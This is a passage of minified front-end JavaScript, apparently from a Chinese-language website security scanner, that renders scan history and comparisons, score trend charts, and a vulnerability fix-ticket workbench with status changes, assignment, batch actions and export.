style="font-size:24px;font-weight:800;color:'+Nt(t.score)+'">'+(t.score||0)+"</div>",o+="</div>",o+='<div style="background:var(--bg);border-radius:2px;padding:10px;text-align:center">',o+='<div style="font-size:12px;color:var(--text-secondary)">'+S(s.created_at||s.time||"")+"</div>",o+='<div style="font-size:24px;font-weight:800;color:'+Nt(s.score)+'">'+(s.score||0)+"</div>",o+="</div>",o+="</div>",o+='<div style="font-size:13px;margin-bottom:8px">分数变化：'+(r.scoreDelta>0?"+":"")+r.scoreDelta+" "+(r.scoreDelta>0||r.scoreDelta<0?"":"->")+"</div>",r.newIssues.length&&(o+='<div style="font-size:12px;color:var(--danger);margin-bottom:6px">新增问题（'+r.newIssues.length+"）</div>",r.newIssues.forEach(function(n){o+='<div style="font-size:12px;padding:4px 8px;background:rgba(199,84,80,0.08);border-radius:2px;margin-bottom:4px">'+S(n.name||n)+"</div>"})),r.fixedIssues.length&&(o+='<div style="font-size:12px;color:var(--success);margin-bottom:6px;margin-top:8px"> 已修复问题（'+r.fixedIssues.length+"）</div>",r.fixedIssues.forEach(function(n){o+='<div style="font-size:12px;padding:4px 8px;background:rgba(115,201,144,0.08);border-radius:2px;margin-bottom:4px">'+S(n.name||n)+"</div>"})),!r.newIssues.length&&!r.fixedIssues.length&&(o+='<div style="font-size:12px;color:var(--text-secondary);text-align:center">两次扫描结果一致，无变化</div>'),o+="</div>";let a=tt("scan-history-list");a&&(a.innerHTML=o),$e("history-pagination","none")}).catch(function(){L("加载失败")})}function so(e,i){let t=(e.findings||[]).map(function(a){return a.name||a}),s=(i.findings||[]).map(function(a){return a.name||a}),r=[],o=[];return s.forEach(function(a){t.indexOf(a)===-1&&r.push({name:a})}),t.forEach(function(a){s.indexOf(a)===-1&&o.push({name:a})}),{scoreDelta:(i.score||0)-(e.score||0),newIssues:r,fixedIssues:o}}function Ln(e){let i=document.getElementById("history-trend-wrap"),t=document.getElementById("history-trend-chart");if(!i||!t)return;let s=e.slice(0,5).reverse();if(s.length<2){i.style.display="none";return}i.style.display="block";let r=t.clientWidth||300,o=60,a=4,n=100,d=s.map(function(c,p){let h=a+p/(s.length-1)*(r-a*2),m=o-a-(c.score||0)/n*(o-a*2);return{x:Math.round(h),y:Math.round(m),score:c.score||0}}),f='<svg width="'+r+'" height="'+o+'" style="overflow:visible">';f+='<line x1="'+a+'" y1="'+o/2+'" x2="'+(r-a)+'" y2="'+o/2+'" stroke="var(--border)" stroke-width="1" stroke-dasharray="2,2"/>';let v=d.map(function(c,p){return(p===0?"M":"L")+c.x+","+c.y}).join(" ");f+='<path d="'+v+'" fill="none" stroke="var(--primary)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>',d.forEach(function(c){let p=c.score>=75?"#73c990":c.score>=50?"#f0a732":"#c75450";f+='<circle cx="'+c.x+'" cy="'+c.y+'" r="3" fill="'+p+'"/>'}),f+="</svg>",t.innerHTML=f}function St(e){e=e||1,Kt=e;let i=tt("scan-history-list");if(i){if(!ve()){i.innerHTML='<p style="text-align:center;color:var(--text-lighter);padding:20px 0">请先登录查看扫描历史</p>',$e("history-pagination","none");return}i.innerHTML='<p style="text-align:center;color:var(--text-lighter);padding:20px 0">正在读取扫描历史...</p>',ce("/api/history?limit=50").then(function(t){return t.json()}).then(function(t){let s=t.history||[];if(s.length===0){i.innerHTML=`<div style="text-align:center;color:var(--text-lighter);padding:30px 0"><div style="font-size:13px">暂无扫描记录</div><div style="font-size:12px;margin-top:6px">点首页「开始体检」试试</div><div style="margin-top:12px"><button class="fixer-btn primary" onclick="navigateTo('scan')">开始体检</button></div></div>`,$e("history-pagination","none");let d=document.getElementById("history-trend-wrap");d&&(d.style.display="none");return}Ln(s);let r=Math.ceil(s.length/ii),o=(e-1)*ii,a=s.slice(o,o+ii),n="";dt||(n+='<div style="text-align:right;margin-bottom:8px">',n+='<button class="fixer-btn secondary" style="height:28px;padding:0 10px;font-size:12px" onclick="toggleHistoryCompareMode()"> 对比模式</button>',n+="</div>"),a.forEach(function(d,f){let v=o+f,c=d.score>=75?"var(--success)":d.score>=50?"var(--warning)":"var(--danger)",p=(s[v+1]||{}).score,h="";if(typeof p=="number"&&(h=(d.score||0)>p?' <span style="color:var(--success);font-size:12px"></span>':(d.score||0)<p?' <span style="color:var(--danger);font-size:12px"></span>':' <span style="color:var(--text-lighter);font-size:12px">-></span>'),dt){let m=Be.indexOf(v)>=0?"checked":"";n+='<label class="menu-item" style="margin-bottom:6px;cursor:pointer;display:flex;align-items:center;gap:10px">',n+='<input type="checkbox" '+m+' onchange="onHistorySelect('+v+')" style="width:16px;height:16px;accent-color:var(--primary)">',n+='<div style="flex:1">',n+='<div style="font-weight:600;font-size:14px">'+S(d.url||d.host||"")+"</div>",n+='<div style="font-size:12px;color:var(--text-light)">'+S(d.created_at||d.time||"")+" &middot; 发现 "+(d.findings_count||0)+" 个问题</div>",n+="</div>",n+='<div style="font-size:20px;font-weight:800;color:'+c+'">'+(d.score||0)+h+"</div>",n+="</label>"}else n+='<div class="menu-item" style="margin-bottom:6px;cursor:pointer" onclick="restoreScanFromHistory('+v+')" role="button" tabindex="0" aria-label="恢复 '+S(d.url||d.host||"")+' 的扫描结果">',n+='<div style="flex:1">',n+='<div style="font-weight:600;font-size:14px">'+S(d.url||d.host||"")+"</div>",n+='<div style="font-size:12px;color:var(--text-light)">'+S(d.created_at||d.time||"")+" &middot; 发现 "+(d.findings_count||0)+" 个问题</div>",n+="</div>",n+='<div style="font-size:20px;font-weight:800;color:'+c+'">'+(d.score||0)+h+"</div>",n+="</div>"}),i.innerHTML=n,gi("history-pagination",e,r,"renderScanHistory")}).catch(function(){i.innerHTML='<p style="text-align:center;color:var(--danger);padding:20px 0">加载失败，请检查网络</p>'})}}function oo(e){ce("/api/history?limit=50").then(function(i){return i.json()}).then(function(i){let t=i.history||[];if(!t[e])return;let s=t[e];Ee("scan");let r=document.getElementById("scan-url");r&&(r.value=s.url||""),L('已填入历史网址，点击"下一步"重新扫描')}).catch(function(){L("加载历史记录失败")})}function _i(){if(!ve()){at("stat-scan-count","0"),at("stat-avg-score","-"),at("stat-fixed-count","0");return}ce("/api/history?limit=50").then(function(e){return e.json()}).then(function(e){let i=e.history||[],t=e.stats||{scan_count:i.length,fixed_count:0},s=document.getElementById("stat-scan-count"),r=document.getElementById("stat-avg-score"),o=document.getElementById("stat-fixed-count");if(s&&(s.textContent=t.scan_count||i.length),r)if(i.length===0)r.textContent="-";else{let a=i.reduce(function(n,d){return n+(d.score||0)},0);r.textContent=Math.round(a/i.length)}o&&(o.textContent=t.fixed_count||0)}).catch(function(){})}window.startScanDirect=xi;window.startScan=wi;window.updateScanStartState=ct;window.dismissHomeOnboarding=ps;window.downloadAuditReport=vs;window.runAuditWorkbench=hs;window.fillAuditTargetFromScan=gs;window.goVerifyStep2=As;window.cancelScan=Ps;window.quickDemo=Ts;window.showFullScanDetail=Is;window.downloadReport=as;window.toggleReportDropdown=ds;window.showBatchScanModal=Ss;window.closeBatchScanModal=Es;window.doBatchScan=zs;window.copyToken=Rs;window.selectVerifyMethod=Bs;window.confirmVerification=Os;window.skipVerification=Ls;window.loadPublicDemo=ms;window.goToFixerWithScanResult=Xs;window.switchFixLang=Vs;window.clearScanHistory=eo;window.cancelHistoryCompare=io;window.doHistoryCompare=ro;window.addMonitorTarget=ss;window.scanRedirectTarget=Ns;window.copyFixCode=Cs;window.renderResult=_t;window.selectFinding=Tn;window.toggleFinding=qs;window.shareResult=$s;window.showPdfDownloadTip=Us;window.restoreScanFromHistory=oo;window.updateProfileStats=_i;window.renderScanHistory=St;window.renderMonitorTargets=bi;window.renderHistoryTrendChart=Ln;window.toggleHistoryCompareMode=to;window.onHistorySelect=no;window.removeMonitorTarget=os;window.generateFixFromResult=Ws;window.verifyFix=Qs;window.downloadAllFixes=Ys;window.downloadFixCode=Ks;window.copyFixCodeByLang=Js;window.switchFixPlatform=Gs;window.switchPublicFixTab=bs;window.doPublicDemoFix=xs;window.renderFixComparison=kn;window.showAutoFixDialog=ws;window.closeAutoFixDialog=ks;window.executeAutoFix=_s;window.retryScan=Ds;window.retryScanWithUrl=js;window.backToScanInput=Hs;window.calculateScore=Ms;window.loadDashboard=fs;window.loadTrend=xn;window.drawTrendChart=wn;window.renderRadarChart=gn;window.buildRadarSvg=Cn;window.animateScoreProgress=hn;window.simulateCSRF=is;window.simulateXSS=ns;window.simulateClickjacking=rs;window.updateStage=Xt;window.animateStages=Sn;window.finishStages=Ne;window.startProgressAnimation=En;window.stopProgressAnimation=ci;window.setScanProgress=zn;window.updateScanCreditsHint=yn;window.loadTrendChart=function(e){e=e||30;let i=document.getElementById("trend-chart");if(!i)return;document.querySelectorAll(".trend-range").forEach(function(s){let r=parseInt(s.getAttribute("data-days"),10)===e;s.style.background=r?"#4b6eaf":"#45494a",s.style.color=r?"#fff":"#808080",s.style.borderColor=r?"#4b6eaf":"#555555"});let t=new Date;t.setDate(t.getDate()-e),t.setHours(0,0,0,0),je("/api/trend?limit="+e).then(function(s){if(!s||!s.success){i.innerHTML="<span>暂无趋势数据</span>";return}let r=s.data&&s.data.series?s.data.series:{},o=Object.keys(r);if(o.length===0){i.innerHTML="<span>扫描几个目标后，即可查看分数变化趋势。</span>";return}let a={},n=0;if(o.forEach(function(v){(r[v]||[]).forEach(function(c){let p=c.time?c.time.replace(" ","T"):"",h=new Date(p);if(!h||isNaN(h.getTime())||h<t)return;n++;let m=p.split("T")[0];a[m]||(a[m]={sum:0,count:0}),a[m].sum+=typeof c.score=="number"?c.score:parseInt(c.score,10)||0,a[m].count++})}),n===0){i.innerHTML="<span>扫描几个目标后，即可查看分数变化趋势。</span>";return}let d=Object.keys(a).sort(),f=d.map(function(v){return Math.round(a[v].sum/a[v].count)});i.innerHTML=ao(f,d)}).catch(function(s){i.innerHTML="<span>加载趋势失败，请稍后重试</span>"})};function ao(e,i,t){if(!e||e.length===0)return"<span>暂无数据</span>";let s=640,r=120,o={top:10,right:10,bottom:24,left:30},a=s-o.left-o.right,n=r-o.top-o.bottom,d=Math.max(0,Math.min.apply(null,e)-5),v=Math.min(100,Math.max.apply(null,e)+5)-d||1;function c(R){return o.left+R/(e.length-1||1)*a}function p(R){return o.top+n-(R-d)/v*n}let h="M"+e.map(function(R,j){return c(j).toFixed(1)+" "+p(R).toFixed(1)}).join(" L"),m=h+" L"+c(e.length-1).toFixed(1)+" "+(r-o.bottom).toFixed(1)+" L"+c(0).toFixed(1)+" "+(r-o.bottom).toFixed(1)+" Z",g=e.map(function(R,j){return'<circle cx="'+c(j).toFixed(1)+'" cy="'+p(R).toFixed(1)+'" r="2.5" fill="#4b6eaf"/>'}).join(""),y=i[0]?i[0].slice(5):"",b=i[i.length-1]?i[i.length-1].slice(5):"",k=e[e.length-1],x=c(e.length-1),C=p(k),z='<rect x="'+(x-16)+'" y="'+(C-18)+'" width="32" height="14" rx="2" fill="#4b6eaf"/>',P='<text x="'+x+'" y="'+(C-8)+'" text-anchor="middle" font-size="9" fill="#fff">'+k+"</text>";return'<svg viewBox="0 0 '+s+" "+r+'" style="width:100%;height:100%"><defs><linearGradient id="trendGrad" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#4b6eaf" stop-opacity="0.35"/><stop offset="100%" stop-color="#4b6eaf" stop-opacity="0.05"/></linearGradient></defs><rect x="'+o.left+'" y="'+o.top+'" width="'+a+'" height="'+n+'" fill="rgba(0,0,0,0.1)" rx="2"/><path d="'+m+'" fill="url(#trendGrad)"/><path d="'+h+'" fill="none" stroke="#4b6eaf" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>'+g+z+P+'<text x="'+o.left+'" y="'+(r-6)+'" font-size="10" fill="#808080">'+S(y)+'</text><text x="'+(s-o.right)+'" y="'+(r-6)+'" text-anchor="end" font-size="10" fill="#808080">'+S(b)+"</text></svg>"}window.addEventListener("load",function(){yt();let e=document.getElementById("scan-url");e&&e.addEventListener("input",yt);let i=document.getElementById("auth-check-step1");i&&i.addEventListener("change",yt);let t=document.getElementById("auth-check");t&&t.addEventListener("change",yt)});function lo(e){let i=Object.assign({},e);const t=new Set;return{getState(){return i},setState(s){i=Object.assign({},i,s),t.forEach(function(r){try{r(i)}catch(o){console.error("store subscriber error:",o)}})},subscribe(s){return t.add(s),function(){t.delete(s)}}}}const me=lo({tickets:[],ticketFilter:"pending",ticketCollaborators:[],user:null});async function co(){const e=await Promise.all([vr(),yr().catch(function(){return{members:[]}})]),i=e[0],t=e[1],s=i&&i.data?i.data:i,r=t&&t.data?t.data:t,o=s&&s.tickets?s.tickets:[],a=r&&r.members?r.members:[];return me.setState({tickets:o,ticketCollaborators:a}),i}function po(e){me.setState({ticketFilter:e})}function uo(){const e=me.getState();return e.tickets.filter(function(i){return i.status===e.ticketFilter})}function nt(e){return me.getState().tickets.find(function(t){return t.id===e})||null}async function fo(e,i){const t=await kt(e,{status:i}),r=me.getState().tickets.map(function(o){return o.id===e?Object.assign({},o,{status:i}):o});return me.setState({tickets:r}),t}async function go(e,i){const t=await kt(e,{notes:i}),r=me.getState().tickets.map(function(o){return o.id===e?Object.assign({},o,{notes:i}):o});return me.setState({tickets:r}),t}async function ho(e,i){const t=await kt(e,{owner:i}),r=me.getState().tickets.map(function(o){return o.id===e?Object.assign({},o,{owner:i}):o});return me.setState({tickets:r}),t}async function vo(e,i){const t=await kt(e,i),r=me.getState().tickets.map(function(o){return o.id===e?Object.assign({},o,i):o});return me.setState({tickets:r}),t}async function mo(e){const i=await Qi(e),s=me.getState().tickets.filter(function(r){return r.id!==e});return me.setState({tickets:s}),i}async function yo(e,i){const t=[];for(let o=0;o<e.length;o++)t.push(await kt(e[o],{status:i}));const r=me.getState().tickets.map(function(o){return e.indexOf(o.id)!==-1?Object.assign({},o,{status:i}):o});return me.setState({tickets:r}),t}async function bo(e){const i=[];for(let r=0;r<e.length;r++)i.push(await Qi(e[r]));const s=me.getState().tickets.filter(function(r){return e.indexOf(r.id)===-1});return me.setState({tickets:s}),i}async function xo(e){const i=await Xe("/api/fix-tickets/"+e+"/verify",{rescan:!0});return me.setState({lastVerifiedAt:Date.now()}),i}async function wo(e,i){return mr(e,i)}const Ze={severityClass:function(e){return e==="high"||e==="critical"?"high":e==="medium"?"medium":"low"},severityLabel:function(e){return{critical:"严重",high:"高危",medium:"中危",low:"低危"}[e]||e},statusLabel:function(e){return{pending:"待修复",confirmed:"已确认",applying:"应用中",in_progress:"修复中",fixed:"已修复",failed:"修复失败",rolled_back:"已回滚",ignored:"已忽略"}[e]||e}};let Ni=!1;function Si(e,i){const t=String((e==null?void 0:e.status)||"").toLowerCase(),s=String((e==null?void 0:e.severity)||"").toLowerCase(),r=Array.isArray(i)?i:[],o=r.filter(v=>v.status==="done").length,a=r.find(v=>v.status==="failed"),n=[...r].reverse().find(v=>v.status==="done"&&v.time);let d="工单已进入整改流程，建议继续推进修复与复测。",f="先确认修复方案，再安排应用和复测。";return t==="fixed"?(d="工单已完成修复闭环，建议保留复测记录与变更证据。",f="归档本次修复结果，并将同类问题纳入后续版本基线。"):t==="failed"?(d="本次修复未通过验证，需要回看失败原因后重新推进。",f="优先检查变更是否完整生效，再安排二次修复和复测。"):t==="rolled_back"?(d="当前工单已回滚，建议先恢复稳定状态再评估新的修复方案。",f="确认回滚影响范围，补齐更稳的修复计划后再重新应用。"):t==="applying"||t==="in_progress"?(d="修复正在推进中，当前重点是确认变更落地并尽快复测。",f="等待配置或代码变更生效后，立即发起复测验证。"):t==="confirmed"&&(d="问题已确认，建议尽快进入实施阶段，避免风险长期暴露。",f="将修复动作落到配置、代码或访问控制上，并保留变更记录。"),(s==="critical"||s==="high")&&t!=="fixed"&&(f="该项等级较高，建议优先安排处理窗口并同步复测计划。"),{headline:d,nextStep:f,progressText:"已完成 "+o+"/"+r.length+" 个闭环阶段",latestTime:n?n.time:"",failedLabel:a?a.label:""}}function On(e){return(Array.isArray(e)?e:[]).map(function(t){const s=Si(t,[]);return["工单 #"+t.id,"名称: "+(t.finding_name||""),"等级: "+(Ze.severityLabel(t.severity)||t.severity||""),"状态: "+(Ze.statusLabel(t.status)||t.status||""),"负责人: "+(t.owner||"未指定"),"处理人: "+(t.assignee||"未指定"),"复核人: "+(t.reviewer||"未指定"),"来源 URL: "+(t.url||""),"备注: "+(t.notes||"无"),"闭环摘要: "+s.headline,"下一步: "+s.nextStep].join(`
`)}).join(`

--------------------

`)}function ko(e){if(Ni)return;Ni=!0;const i=document.body;i&&(i.addEventListener("click",_o),i.addEventListener("change",So))}function _o(e){if(e.target.closest(".ticket-checkbox")||e.target.closest(".ticket-check"))return;const i=e.target.closest("[data-action]");if(!i)return;const t=i.dataset.action,s=i.dataset.id?parseInt(i.dataset.id,10):null,r=i.dataset.status||null;switch(t){case"switch-ticket-tab":r&&Eo(r);break;case"show-detail":s&&ft(s);break;case"verify":s&&jo(s);break;case"edit-notes":s&&Bo(s);break;case"open-fixer":s&&Pn(s);break;case"open-report":s&&Ro(s);break;case"copy-summary":s&&Mo(s);break;case"edit-owner":s&&Lo(s);break;case"edit-collaborators":s&&Oo(s);break;case"export-ticket":s&&Po(s);break;case"delete":s&&Ao(s);break;case"batch-update":r&&zo(r);break;case"batch-delete":Co();break;case"batch-export":To();break;case"toggle-select-all":Mn(i);break}}function So(e){const i=e.target;if(i.classList.contains("ticket-checkbox")){Ei();return}const t=i.closest("[data-action]");if(!t)return;const s=t.dataset.action,r=t.dataset.id?parseInt(t.dataset.id,10):null;switch(s){case"change-status":r&&Io(r,i.value);break;case"toggle-select-all":Mn(i);break}}function Eo(e){po(e),document.querySelectorAll(".ticket-tab").forEach(function(i){i.classList.toggle("active",i.dataset.status===e)}),Rn()}function We(){if(!ve()){$e("ticket-workbench","none"),$e("ticket-empty","block"),$e("ticket-batch-bar","none"),Zi("ticket-empty",'<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>请先登录查看工单</p></div>');return}return co().then(function(){Rn()}).catch(function(e){L("加载工单失败: "+e.message,"error")})}function Rn(){let e=document.getElementById("ticket-list"),i=document.getElementById("ticket-empty"),t=document.getElementById("ticket-batch-bar"),s=document.getElementById("ticket-workbench"),r=document.getElementById("ticket-detail-panel");if(!e)return;let o=uo();if(o.length===0){e.innerHTML="",i&&(i.style.display="block"),t&&(t.style.display="none"),s&&(s.style.display="none"),r&&(r.innerHTML='<div class="ticket-detail-empty">选择左侧工单查看详情</div>');return}i&&(i.style.display="none"),t&&(t.style.display="flex"),s&&(s.style.display="flex");let a="";o.forEach(function(n){let d=Ze.severityClass(n.severity),f=Ze.severityLabel(n.severity),v=Ze.statusLabel(n.status);a+='<tr class="ticket-row" data-action="show-detail" data-id="'+n.id+'">',a+='<td><label class="ticket-check"><input type="checkbox" class="ticket-checkbox" value="'+n.id+'"></label></td>',a+='<td class="ticket-title-cell">'+S(n.finding_name)+"</td>",a+='<td><span class="ticket-severity '+d+'">'+f+"</span></td>",a+='<td><span class="ticket-status-badge">'+v+"</span></td>",a+='<td class="ticket-date-cell">'+(n.created_at||"")+"</td>",a+="</tr>"}),e.innerHTML=a,Ei()}function ft(e){let i=nt(e);if(!i)return;let t=document.getElementById("ticket-detail-panel");if(!t)return;let s=Ze.severityClass(i.severity),r=Ze.severityLabel(i.severity),o=Ze.statusLabel(i.status),a='<div class="ticket-detail-header">';a+='<div class="ticket-detail-title">'+S(i.finding_name)+"</div>",a+='<div class="ticket-detail-badges"><span class="ticket-severity '+s+'">'+r+'</span><span class="ticket-status-badge">'+o+"</span></div>",a+="</div>",a+='<div class="ticket-detail-meta">工单 #'+i.id+(i.scan_id?" · 扫描 #"+i.scan_id:"")+" · "+(i.created_at||"")+"</div>",a+='<div class="ticket-owner-bar"><div class="ticket-owner-chip">负责人：'+S(i.owner||"未指定")+"</div>",a+='<div class="ticket-owner-chip">处理人：'+S(i.assignee||"未指定")+"</div>",a+='<div class="ticket-owner-chip">复核人：'+S(i.reviewer||"未指定")+"</div>",a+='<div class="ticket-owner-chip subtle">目标：'+S(i.target_host||i.url||"未记录")+"</div></div>",a+='<div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px">',a+='<div style="background:rgba(75,110,175,0.12);color:var(--primary-light);border:1px solid rgba(75,110,175,0.28);padding:4px 10px;border-radius:999px;font-size:12px">建议：'+(i.status==="fixed"?"尽快复测确认":i.status==="failed"?"回看失败原因并回滚":i.status==="applying"?"等待变更生效后复测":"推进修复并保留变更记录")+"</div>",a+='<div style="background:rgba(75,110,175,0.12);color:var(--primary-light);border:1px solid rgba(75,110,175,0.28);padding:4px 10px;border-radius:999px;font-size:12px">优先级：'+r+"</div>",i.finding_type&&(a+='<div style="background:rgba(75,110,175,0.12);color:var(--primary-light);border:1px solid rgba(75,110,175,0.28);padding:4px 10px;border-radius:999px;font-size:12px">类型：'+S(i.finding_type)+"</div>"),a+="</div>";let n=Si(i,[]);if(a+='<div class="ticket-closure-card">',a+='<div class="ticket-closure-title">闭环摘要</div>',a+='<div class="ticket-closure-headline">'+S(n.headline)+"</div>",a+='<div class="ticket-closure-progress">'+S(n.progressText)+"</div>",a+='<div class="ticket-closure-next">下一步：'+S(n.nextStep)+"</div>",a+="</div>",a+='<div class="ticket-detail-section"><div class="ticket-detail-label">修复闭环</div>',a+='<div class="ticket-timeline" id="ticket-timeline-'+i.id+'"><div class="ticket-timeline-loading">正在读取时间线...</div></div></div>',a+='<div class="ticket-detail-section"><div class="ticket-detail-label">操作历史</div><div class="ticket-activity-list" id="ticket-activity-'+i.id+'"><div class="ticket-timeline-loading">正在读取操作历史...</div></div></div>',i.fix_code&&(a+='<div class="ticket-detail-section"><div class="ticket-detail-label">修复代码</div><pre class="ticket-detail-code">'+S(i.fix_code)+"</pre></div>"),i.url&&(a+='<div class="ticket-detail-section"><div class="ticket-detail-label">漏洞位置</div><code class="ticket-detail-url">'+S(i.url)+"</code></div>"),i.notes&&(a+='<div class="ticket-detail-section"><div class="ticket-detail-label">备注</div><div class="ticket-detail-notes">'+S(i.notes)+"</div></div>"),i.diff_summary&&i.diff_summary!=="{}")try{let d=JSON.parse(i.diff_summary);a+='<div class="ticket-detail-section"><div class="ticket-detail-label">复测结果</div>',a+='<div class="ticket-diff-summary">',d.verified_fixed&&(a+='<div class="ticket-diff-item success">已验证修复</div>'),d.summary&&(a+='<div class="ticket-diff-stats">消除 '+(d.summary.eliminated_count||0)+" · 新增 "+(d.summary.new_count||0)+" · 保留 "+(d.summary.retained_count||0)+"</div>",a+='<div class="ticket-diff-score">评分变化：'+(d.before_score||0)+" → "+(d.after_score||0)+" ("+(d.score_delta>0?"+":"")+d.score_delta+")</div>"),a+="</div></div>"}catch{}a+='<div class="ticket-detail-actions">',a+='<select class="ticket-status-select" data-action="change-status" data-id="'+i.id+'" title="选择当前修复进度">',a+='<option value="pending"'+(i.status==="pending"?" selected":"")+">待修复</option>",a+='<option value="confirmed"'+(i.status==="confirmed"?" selected":"")+">已确认</option>",a+='<option value="applying"'+(i.status==="applying"?" selected":"")+">应用中</option>",a+='<option value="in_progress"'+(i.status==="in_progress"?" selected":"")+">修复中</option>",a+='<option value="fixed"'+(i.status==="fixed"?" selected":"")+">已修复</option>",a+='<option value="failed"'+(i.status==="failed"?" selected":"")+">修复失败</option>",a+='<option value="rolled_back"'+(i.status==="rolled_back"?" selected":"")+">已回滚</option>",a+='<option value="ignored"'+(i.status==="ignored"?" selected":"")+">已忽略</option>",a+="</select>",a+='<button class="ticket-btn primary" data-action="verify" data-id="'+i.id+'">复测验证</button>',a+='<button class="ticket-btn secondary" data-action="open-fixer" data-id="'+i.id+'">去修复器</button>',a+='<button class="ticket-btn secondary" data-action="open-report" data-id="'+i.id+'">回到报告</button>',a+='<button class="ticket-btn secondary" data-action="copy-summary" data-id="'+i.id+'">复制摘要</button>',a+='<button class="ticket-btn secondary" data-action="edit-owner" data-id="'+i.id+'">负责人</button>',a+='<button class="ticket-btn secondary" data-action="edit-collaborators" data-id="'+i.id+'">分派协同</button>',a+='<button class="ticket-btn secondary" data-action="edit-notes" data-id="'+i.id+'">备注</button>',a+='<button class="ticket-btn secondary" data-action="export-ticket" data-id="'+i.id+'">导出工单</button>',a+='<button class="ticket-btn danger" data-action="delete" data-id="'+i.id+'">删除</button>',a+="</div>",t.innerHTML=a,Fo(i.id),document.querySelectorAll(".ticket-row").forEach(function(d){d.classList.toggle("selected",parseInt(d.dataset.id)===e)})}function Ei(){let e=document.querySelectorAll(".ticket-checkbox:checked"),i=document.getElementById("ticket-selected-count");i&&(i.textContent="已选 "+e.length+" 项")}function Mn(e){let i=e?e.checked:!1;document.querySelectorAll(".ticket-checkbox").forEach(function(t){t.checked=i}),document.querySelectorAll('[data-action="toggle-select-all"]').forEach(function(t){t.checked=i}),Ei()}function zi(){let e=[];return document.querySelectorAll(".ticket-checkbox:checked").forEach(function(i){e.push(parseInt(i.value,10))}),e}function zo(e){let i=zi();if(i.length===0){L("请先选择工单","error");return}yo(i,e).then(function(){return L("已批量更新 "+i.length+" 个工单","success"),We()}).catch(function(t){L("批量更新失败: "+t.message,"error")})}function Co(){let e=zi();if(e.length===0){L("请先选择工单","error");return}confirm("确定删除选中的 "+e.length+" 个工单？")&&bo(e).then(function(){return L("已批量删除 "+e.length+" 个工单","success"),We()}).catch(function(i){L("批量删除失败: "+i.message,"error")})}function To(){let e=zi();if(e.length===0){L("请先选择工单","error");return}let t=me.getState().tickets.filter(function(n){return e.indexOf(n.id)!==-1}),s=On(t);const r=new Blob([s],{type:"text/plain;charset=utf-8"}),o=URL.createObjectURL(r),a=document.createElement("a");a.href=o,a.download="ticket-summary-"+new Date().toISOString().slice(0,10)+".txt",document.body.appendChild(a),a.click(),a.remove(),setTimeout(function(){URL.revokeObjectURL(o)},1e3),L("已导出 "+e.length+" 个工单摘要","success")}function Io(e,i){fo(e,i).then(function(){return L("状态已更新","success"),We().then(function(){ft(e)})}).catch(function(t){L("更新失败: "+t.message,"error")})}function Ao(e){confirm("确定删除该工单？")&&mo(e).then(function(){L("工单已删除","success");let i=document.getElementById("ticket-detail-panel");return i&&(i.innerHTML='<div class="ticket-detail-empty">选择左侧工单查看详情</div>'),We()}).catch(function(i){L("删除失败: "+i.message,"error")})}function Bo(e){let i=nt(e),t=prompt("编辑备注:",i&&i.notes?i.notes:"");t!==null&&go(e,t).then(function(){return L("备注已保存","success"),We().then(function(){ft(e)})}).catch(function(s){L("保存失败: "+s.message,"error")})}function Lo(e){let i=nt(e),t=me.getState(),s=Array.isArray(t.ticketCollaborators)?t.ticketCollaborators:[],r=s.length?`
可选成员: `+s.join(" / "):"",o=prompt("设置负责人:"+r,i&&i.owner?i.owner:"");o!==null&&ho(e,o).then(function(){return L("负责人已更新","success"),We().then(function(){ft(e)})}).catch(function(a){L("更新失败: "+a.message,"error")})}function Oo(e){let i=nt(e),t=me.getState(),s=Array.isArray(t.ticketCollaborators)?t.ticketCollaborators:[],r=s.length?`
可选成员: `+s.join(" / "):"",o=prompt("设置处理人:"+r,i&&i.assignee?i.assignee:"");if(o===null)return;let a=prompt("设置复核人:"+r,i&&i.reviewer?i.reviewer:"");a!==null&&vo(e,{assignee:o,reviewer:a}).then(function(){return L("协同分派已更新","success"),We().then(function(){ft(e)})}).catch(function(n){L("更新失败: "+n.message,"error")})}function Pn(e){let i=nt(e);if(i){try{i.url&&window.localStorage&&localStorage.setItem("vs_fixer_ticket",JSON.stringify({ticket_id:i.id,scan_id:i.scan_id||null,url:i.url,finding_name:i.finding_name||"",finding_type:i.finding_type||"",severity:i.severity||"low"}))}catch{}typeof window.navigateTo=="function"?window.navigateTo("fixer"):window.location.hash="#page-fixer"}}function Ro(e){nt(e)&&(typeof window.navigateTo=="function"?window.navigateTo("home"):window.location.hash="#page-home")}function Mo(e){let i=nt(e);if(!i)return;let t=On([i])+`
备注: `+(i.notes||"");wt(t).then(function(){L("工单摘要已复制")})}function Po(e){wo(e,"markdown").then(function(i){return i.blob().then(function(t){const s=URL.createObjectURL(t),r=document.createElement("a");r.href=s,r.download="fix-ticket-"+e+".md",document.body.appendChild(r),r.click(),r.remove(),setTimeout(function(){URL.revokeObjectURL(s)},1e3),L("工单导出已开始","success")})}).catch(function(){L("导出失败","error")})}function Fo(e){let i=document.getElementById("ticket-timeline-"+e),t=document.getElementById("ticket-activity-"+e);i&&je("/api/fix-tickets/"+e+"/timeline").then(function(s){let r=s&&s.data?s.data:s;if(!r||!r.timeline){i.innerHTML='<div class="ticket-timeline-empty">暂无时间线数据</div>',t&&(t.innerHTML='<div class="ticket-timeline-empty">暂无操作记录</div>');return}let o='<div class="ticket-timeline-steps">';r.timeline.forEach(function(n,d){let f="step-"+n.status,v={done:"✓",doing:"●",pending:"○",failed:"✗",rolled_back:"↩"}[n.status]||"○";o+='<div class="ticket-timeline-step '+f+'">',o+='<div class="ticket-timeline-icon">'+v+"</div>",o+='<div class="ticket-timeline-content">',o+='<div class="ticket-timeline-label">'+S(n.label)+"</div>",n.time&&(o+='<div class="ticket-timeline-time">'+S(n.time)+"</div>"),o+="</div></div>",d<r.timeline.length-1&&(o+='<div class="ticket-timeline-line"></div>')}),o+="</div>",i.innerHTML=o;let a=i.parentElement?i.parentElement.parentElement.querySelector(".ticket-closure-card"):null;if(a&&r.ticket){let n=Si(r.ticket,r.timeline);a.innerHTML='<div class="ticket-closure-title">闭环摘要</div><div class="ticket-closure-headline">'+S(n.headline)+'</div><div class="ticket-closure-progress">'+S(n.progressText)+"</div>"+(n.latestTime?'<div class="ticket-closure-progress">最近进展：'+S(n.latestTime)+"</div>":"")+(n.failedLabel?'<div class="ticket-closure-progress">当前阻塞：'+S(n.failedLabel)+"</div>":"")+'<div 